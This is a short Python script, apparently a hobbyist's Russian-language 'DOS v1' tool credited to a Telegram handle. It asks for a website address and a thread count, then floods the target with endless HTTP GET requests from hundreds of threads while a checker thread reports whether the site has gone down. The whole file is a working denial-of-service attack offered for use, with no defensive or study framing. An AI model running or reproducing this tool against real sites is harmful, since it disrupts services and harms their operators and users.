import time
import random
import os
import threading
import requests


#
#   --------------------------------------
#   Автор софта: Meppci | Telegram: Meppci
#   --------------------------------------
#



def clear():
    os.system("cls")    # функция отчистки экрана

print("DOS v1")
print("Made by Meppci | Telegram: @Meppci\n")

adress = input("Введите адрес сайта: ")
total_threads = input("Введите число потоков, желательно - [500-1000]: ")
time.sleep(1)
clear()


print(f"""
Введенные вами данные:
Адрес: {adress}
Кол-во потоков: {total_threads}
""")

print("\nНажмите любую клавишу чтобы начать атаку на выбранный Адрес.")
input()
clear()
print(f"Начинаю атаку на: {adress}")
time.sleep(2)


def checker():
    while True:
        try:
            r = requests.get(str(adress))
            if str(r) == "<Response [200]>":
                print("[~] Сайт все еще живой, продолжаю DOS атаку...")
            else:
                print("[#] Сайт упал!")
        except:
            print("Сайт оборвал соединение, возможно он упал либо защищен от DOS атак.")
            time.sleep(5)



def dos():
    packets = 0
    while True:
        packets += 1
        try:
            requests.get(str(adress))
        except:
            print("Сайт упал либо он защищен от DOS атак.")
            time.sleep(5)


threading.Thread(target=checker).start()

a = 0
while a < int(total_threads):
    threading.Thread(target=dos).start()
    a += 1
    print(f"Запустил поток номер: {a}")
